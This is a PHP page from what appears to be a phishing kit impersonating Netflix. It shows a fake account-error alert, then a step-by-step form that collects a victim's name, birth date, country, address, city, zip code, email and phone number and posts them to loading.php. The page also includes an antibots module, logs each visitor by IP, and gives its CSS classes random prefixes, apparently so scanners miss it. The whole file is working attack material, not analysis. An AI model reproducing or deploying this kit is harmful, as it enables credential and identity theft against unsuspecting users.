<?php
    error_reporting(0);
    session_start();
    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    require_once "../setting/lang.php";

    // Lang Fucntion :
    lang();

    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page Information Error";
    get_page_info($get_name_page, $get_name_file);
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/global-rules.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Netflix - <?php echo get_text('title_head_3'); ?></title>
</head>
<body id="body">

    <!-- Navigation -->
    <nav>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-nav">
                <img src="../img/logo.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-sign-out show-message-explain"><?php echo get_text('logout'); ?></span>
            </div>
        </div>
    </nav>
    <!-- Navigation -->

    <!-- Start Main -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> main">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-main">
                <form action="./loading.php" method="post" id="formData">
                    <input type="hidden" name="step" value="information-error">
                    <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alret-block-account">
                        <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-triangle-exclamation"></i>
                        <p>
                            <?php echo get_text('message_error_pages_2'); ?>
                        </p>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> steps"><?php echo get_text('step_small_one'); ?></div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container-progress">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> progress" style="width: 25%;"></div>
                    </div>
                    <h1><?php echo get_text('title_step_3'); ?></h1>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div1">
                        <label for="firstName" id="labelFirstName"><?php echo get_text('first_name_label'); ?></label>
                        <input type="text" autofocus="true" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="first_name" id="firstName">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError1"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
    
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div2">
                        <label for="lastName" id="labelLastName"><?php echo get_text('last_name_label'); ?></label>
                        <input type="text" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="last_name" id="lastName">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError2"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div3">
                        <label for="birthday" id="labelBirthday"><?php echo get_text('birthday_label'); ?></label>
                        <input type="tel" oninput="DateOfBirth();" maxlength="10" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" maxlength="10" name="birthday" id="birthday">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError3"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
                    
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div4">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> lable-country"><?php echo get_text('country_label'); ?></span>
                        <select name="country" id="country" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-select">
                            <option value="0" selected=""><?php echo get_text('country_label_inside_option'); ?></option>
                            <option value="AFG">Afghanistan</option>
                            <option value="ALA">Åland Islands</option>
                            <option value="ALB">Albania</option>
                            <option value="DZA">Algeria</option>
                            <option value="ASM">American Samoa</option>
                            <option value="AND">Andorra</option>
                            <option value="AGO">Angola</option>
                            <option value="AIA">Anguilla</option>
                            <option value="ATA">Antarctica</option>
                            <option value="ATG">Antigua And Barbuda</option>
                            <option value="ARG">Argentina</option>
                            <option value="ARM">Armenia</option>
                            <option value="ABW">Aruba</option>
                            <option value="AUS">Australia</option>
                            <option value="AUT">Austria</option>
                            <option value="AZE">Azerbaijan</option>
                            <option value="BHS">Bahamas</option>
                            <option value="BHR">Bahrain</option>
                            <option value="BGD">Bangladesh</option>
                            <option value="BRB">Barbados</option>
                            <option value="BLR">Belarus</option>
                            <option value="BEL">Belgium</option>
                            <option value="BLZ">Belize</option>
                            <option value="BEN">Benin</option>
                            <option value="BMU">Bermuda</option>
                            <option value="BTN">Bhutan</option>
                            <option value="BOL">Bolivia</option>
                            <option value="BIH">Bosnia and Herzegovina</option>
                            <option value="BWA">Botswana</option>
                            <option value="BVT">Bouvet Island</option>
                            <option value="BRA">Brazil</option>
                            <option value="VGB">British Virgin Islands</option>
                            <option value="BRN">Brunei Darussalam</option>
                            <option value="BGR">Bulgaria</option>
                            <option value="BFA">Burkina Faso</option>
                            <option value="BDI">Burundi</option>
                            <option value="KHM">Cambodia</option>
                            <option value="CMR">Cameroon</option>
                            <option value="CAN">Canada</option>
                            <option value="CPV">Cape Verde</option>
                            <option value="BES">Caribbean Netherlands</option>
                            <option value="CYM">Cayman Islands</option>
                            <option value="CAF">Central African Republic</option>
                            <option value="TCD">Chad</option>
                            <option value="IOT">Chagos Archipelago</option>
                            <option value="CHL">Chile</option>
                            <option value="CHN">China mainland</option>
                            <option value="CXR">Christmas Island</option>
                            <option value="CCK">Cocos (Keeling) Islands</option>
                            <option value="COL">Colombia</option>
                            <option value="COM">Comoros</option>
                            <option value="COK">Cook Islands</option>
                            <option value="CRI">Costa Rica</option>
                            <option value="CIV">Côte d'Ivoire</option>
                            <option value="HRV">Croatia</option>
                            <option value="CUW">Curaçao</option>
                            <option value="CYP">Cyprus</option>
                            <option value="CZE">Czechia</option>
                            <option value="COD">Democratic Republic of the Congo</option>
                            <option value="DNK">Denmark</option>
                            <option value="DJI">Djibouti</option>
                            <option value="DMA">Dominica</option>
                            <option value="DOM">Dominican Republic</option>
                            <option value="ECU">Ecuador</option>
                            <option value="EGY">Egypt</option>
                            <option value="SLV">El Salvador</option>
                            <option value="GNQ">Equatorial Guinea</option>
                            <option value="ERI">Eritrea</option>
                            <option value="EST">Estonia</option>
                            <option value="SWZ">Eswatini</option>
                            <option value="ETH">Ethiopia</option>
                            <option value="FLK">Falkland Islands</option>
                            <option value="FRO">Faroe Islands</option>
                            <option value="FJI">Fiji</option>
                            <option value="FIN">Finland</option>
                            <option value="FRA">France</option>
                            <option value="GUF">French Guiana</option>
                            <option value="PYF">French Polynesia</option>
                            <option value="ATF">French Southern Territories</option>
                            <option value="GAB">Gabon</option>
                            <option value="GMB">Gambia</option>
                            <option value="GEO">Georgia</option>
                            <option value="DEU">Germany</option>
                            <option value="GHA">Ghana</option>
                            <option value="GIB">Gibraltar</option>
                            <option value="GRC">Greece</option>
                            <option value="GRL">Greenland</option>
                            <option value="GRD">Grenada</option>
                            <option value="GLP">Guadeloupe</option>
                            <option value="GUM">Guam</option>
                            <option value="GTM">Guatemala</option>
                            <option value="GGY">Guernsey</option>
                            <option value="GIN">Guinea</option>
                            <option value="GNB">Guinea-Bissau</option>
                            <option value="GUY">Guyana</option>
                            <option value="HTI">Haiti</option>
                            <option value="HMD">Heard And Mc Donald Islands</option>
                            <option value="HND">Honduras</option>
                            <option value="HKG">Hong Kong</option>
                            <option value="HUN">Hungary</option>
                            <option value="ISL">Iceland</option>
                            <option value="IND">India</option>
                            <option value="IDN">Indonesia</option>
                            <option value="IRQ">Iraq</option>
                            <option value="IRL">Ireland</option>
                            <option value="IMN">Isle of Man</option>
                            <option value="ISR">Israel</option>
                            <option value="ITA">Italy</option>
                            <option value="JAM">Jamaica</option>
                            <option value="JPN">Japan</option>
                            <option value="JEY">Jersey</option>
                            <option value="JOR">Jordan</option>
                            <option value="KAZ">Kazakhstan</option>
                            <option value="KEN">Kenya</option>
                            <option value="KIR">Kiribati</option>
                            <option value="XKS">Kosovo</option>
                            <option value="KWT">Kuwait</option>
                            <option value="KGZ">Kyrgyzstan</option>
                            <option value="LAO">Laos</option>
                            <option value="LVA">Latvia</option>
                            <option value="LBN">Lebanon</option>
                            <option value="LSO">Lesotho</option>
                            <option value="LBR">Liberia</option>
                            <option value="LBY">Libya</option>
                            <option value="LIE">Liechtenstein</option>
                            <option value="LTU">Lithuania</option>
                            <option value="LUX">Luxembourg</option>
                            <option value="MAC">Macao</option>
                            <option value="MDG">Madagascar</option>
                            <option value="MWI">Malawi</option>
                            <option value="MYS">Malaysia</option>
                            <option value="MDV">Maldives</option>
                            <option value="MLI">Mali</option>
                            <option value="MLT">Malta</option>
                            <option value="MHL">Marshall Islands</option>
                            <option value="MTQ">Martinique</option>
                            <option value="MRT">Mauritania</option>
                            <option value="MUS">Mauritius</option>
                            <option value="MYT">Mayotte</option>
                            <option value="MEX">Mexico</option>
                            <option value="FSM">Micronesia</option>
                            <option value="MDA">Moldova</option>
                            <option value="MCO">Monaco</option>
                            <option value="MNG">Mongolia</option>
                            <option value="MNE">Montenegro</option>
                            <option value="MSR">Montserrat</option>
                            <option value="MAR">Morocco</option>
                            <option value="MOZ">Mozambique</option>
                            <option value="MMR">Myanmar</option>
                            <option value="NAM">Namibia</option>
                            <option value="NRU">Nauru</option>
                            <option value="NPL">Nepal</option>
                            <option value="NLD">Netherlands</option>
                            <option value="NCL">New Caledonia</option>
                            <option value="NZL">New Zealand</option>
                            <option value="NIC">Nicaragua</option>
                            <option value="NER">Niger</option>
                            <option value="NGA">Nigeria</option>
                            <option value="NIU">Niue</option>
                            <option value="NFK">Norfolk Island</option>
                            <option value="MNP">Northern Mariana Islands</option>
                            <option value="MKD">North Macedonia</option>
                            <option value="NOR">Norway</option>
                            <option value="OMN">Oman</option>
                            <option value="PAK">Pakistan</option>
                            <option value="PLW">Palau</option>
                            <option value="PSE">Palestinian Territories</option>
                            <option value="PAN">Panama</option>
                            <option value="PNG">Papua New Guinea</option>
                            <option value="PRY">Paraguay</option>
                            <option value="PER">Peru</option>
                            <option value="PHL">Philippines</option>
                            <option value="PCN">Pitcairn</option>
                            <option value="POL">Poland</option>
                            <option value="PRT">Portugal</option>
                            <option value="PRI">Puerto Rico</option>
                            <option value="QAT">Qatar</option>
                            <option value="COG">Republic of the Congo</option>
                            <option value="REU">Réunion</option>
                            <option value="ROU">Romania</option>
                            <option value="RUS">Russia</option>
                            <option value="RWA">Rwanda</option>
                            <option value="BLM">Saint Barthélemy</option>
                            <option value="SHN">Saint Helena</option>
                            <option value="KNA">Saint Kitts And Nevis</option>
                            <option value="LCA">Saint Lucia</option>
                            <option value="MAF">Saint Martin</option>
                            <option value="VCT">Saint Vincent and the Grenadines</option>
                            <option value="WSM">Samoa</option>
                            <option value="SMR">San Marino</option>
                            <option value="STP">Sao Tome And Principe</option>
                            <option value="SAU">Saudi Arabia</option>
                            <option value="SEN">Senegal</option>
                            <option value="SRB">Serbia</option>
                            <option value="SYC">Seychelles</option>
                            <option value="SLE">Sierra Leone</option>
                            <option value="SGP">Singapore</option>
                            <option value="SXM">Sint Maarten</option>
                            <option value="SVK">Slovakia</option>
                            <option value="SVN">Slovenia</option>
                            <option value="SLB">Solomon Islands</option>
                            <option value="SOM">Somalia</option>
                            <option value="ZAF">South Africa</option>
                            <option value="SGS">South Georgia and South Sandwich Islands</option>
                            <option value="KOR">South Korea</option>
                            <option value="SSD">South Sudan</option>
                            <option value="ESP">Spain</option>
                            <option value="LKA">Sri Lanka</option>
                            <option value="SPM">St. Pierre And Miquelon</option>
                            <option value="SDN">Sudan</option>
                            <option value="SUR">Suriname</option>
                            <option value="SJM">Svalbard And Jan Mayen Islands</option>
                            <option value="SWE">Sweden</option>
                            <option value="CHE">Switzerland</option>
                            <option value="TWN">Taiwan</option>
                            <option value="TJK">Tajikistan</option>
                            <option value="TZA">Tanzania</option>
                            <option value="THA">Thailand</option>
                            <option value="TLS">Timor-Leste</option>
                            <option value="TGO">Togo</option>
                            <option value="TKL">Tokelau</option>
                            <option value="TON">Tonga</option>
                            <option value="TTO">Trinidad and Tobago</option>
                            <option value="TUN">Tunisia</option>
                            <option value="TUR">Türkiye</option>
                            <option value="TKM">Turkmenistan</option>
                            <option value="TCA">Turks and Caicos Islands</option>
                            <option value="TUV">Tuvalu</option>
                            <option value="UGA">Uganda</option>
                            <option value="UKR">Ukraine</option>
                            <option value="ARE">United Arab Emirates</option>
                            <option value="GBR">United Kingdom</option>
                            <option value="USA">United States</option>
                            <option value="UMI">United States Minor Outlying Islands</option>
                            <option value="URY">Uruguay</option>
                            <option value="UZB">Uzbekistan</option>
                            <option value="VUT">Vanuatu</option>
                            <option value="VAT">Vatican</option>
                            <option value="VEN">Venezuela</option>
                            <option value="VNM">Vietnam</option>
                            <option value="VIR">Virgin Islands (U.S.)</option>
                            <option value="WLF">Wallis And Futuna Islands</option>
                            <option value="ESH">Western Sahara</option>
                            <option value="YEM">Yemen</option>
                            <option value="ZMB">Zambia</option>
                            <option value="ZWE">Zimbabwe</option>
                        </select>
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error"  id="messageError4"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
    
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div5">
                        <label for="address" id="labelAddress"><?php echo get_text('address_label'); ?></label>
                        <input type="text" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="address" id="address">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError5"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
    
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div6">
                        <label for="city" id="labelCity"><?php echo get_text('city_label'); ?></label>
                        <input type="text" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="city" id="city">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError6"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?>.</small>
                    </div>
    
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div7">
                        <label for="zipCode" id="labelZipCode"><?php echo get_text('zip_code_label'); ?></label>
                        <input type="text" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="zip_code" id="zipCode">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError7"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div8">
                        <label for="email" id="labelEmail"><?php echo get_text('email_label'); ?></label>
                        <input type="email" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="email" id="email">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError8"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
    
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-inputs" id="div9">
                        <label for="phoneNumber" id="labelPhoneNumber"><?php echo get_text('phone_label'); ?></label>
                        <input type="tel" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> input-other" name="phoneNumber" id="phoneNumber">
                        <small class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-error" id="messageError9"><img src="../img/icon-error-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_inputs'); ?></small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-button">
                        <button type="submit"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-send-data" id="buttonSendData" name="send_data_4"><?php echo get_text('button_send_data'); ?></button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <!-- Start Main -->

    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> footer">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-footer">
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain"><?php echo get_text('title_footer'); ?></h1>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-footer">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_1'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_2'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_3'); ?></span>
                    </div>

                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_4'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_5'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_6'); ?></span>
                    </div>
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> box-lang">
                  <img src="../img/icon-lang-2.png" alt="">
                    <select>
                        <option value=""><?php echo get_text('lang_footer'); ?></option>
                    </select>
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> svg-select-lang" width="16" height="16" viewBox="0 0 16 16" role="img" data-icon="CaretDownSmall" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path></svg>
                </div>
            </div>
        </div>
    </div>

    <!-- Message Explain -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-user" id="messageUser">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-message-user">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-messsage-user">
                <img src="../img/logo.png" alt="">
                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-header" id="closeMessageuser1" type="button"><i
                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark"></i></button>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-message-user">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alert-icon">
                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-shield-halved"></i>
                </span>
                <h2><?php echo get_text('title_message_user'); ?></h2>
                <p>
                    <?php echo get_text('text_message_user'); ?>
                </p>
                <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-user" id="closeMessageuser2"><?php echo get_text('button_message_user'); ?></button>
            </div>
        </div>
    </div>
    <!-- Message Explain -->

    <!-- JS -->
    <script src="../js/main.js"></script>
    <script src="../js/script-info.js"></script>
    <script>
        function validate(){return!0}function DateOfBirth(){var e=event.data,t=event.target.value;if("insertText"==event.inputType)switch(isNaN(parseInt(e))&&(event.target.value=t.slice(0,t.length-1)),t.length){case 1:e>1&&(event.target.value="");break;case 2:1==t[0]&&e>2||isNaN(parseInt(e))?event.target.value=t.slice(0,t.length-1):0==t[3]&&0==e?event.target.value=t.slice(0,t.length-1):event.target.value=event.target.value+"/";break;case 4:e>3&&(event.target.value=t.slice(0,t.length-1));break;case 5:t[3]>=3&&e>1||isNaN(parseInt(e))?event.target.value=t.slice(0,t.length-1):0==t[0]&&0==e?event.target.value=t.slice(0,t.length-1):event.target.value=event.target.value+"/";break;case 7:(e<1||e>2)&&(event.target.value=t.slice(0,t.length-1));break;case 8:1==t[6]&&e<9?event.target.value=t.slice(0,t.length-1):2==t[6]&&e>0&&(event.target.value=t.slice(0,t.length-1));break;case 9:2==t[6]&&e>1&&(event.target.value=t.slice(0,t.length-1))}"deleteContentBackward"==event.inputType&&2==t.length?event.target.value=t[0]:"deleteContentBackward"==event.inputType&&5==t.length&&(event.target.value=t.slice(0,t.length-1))}
    </script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?>

</body>
</html>
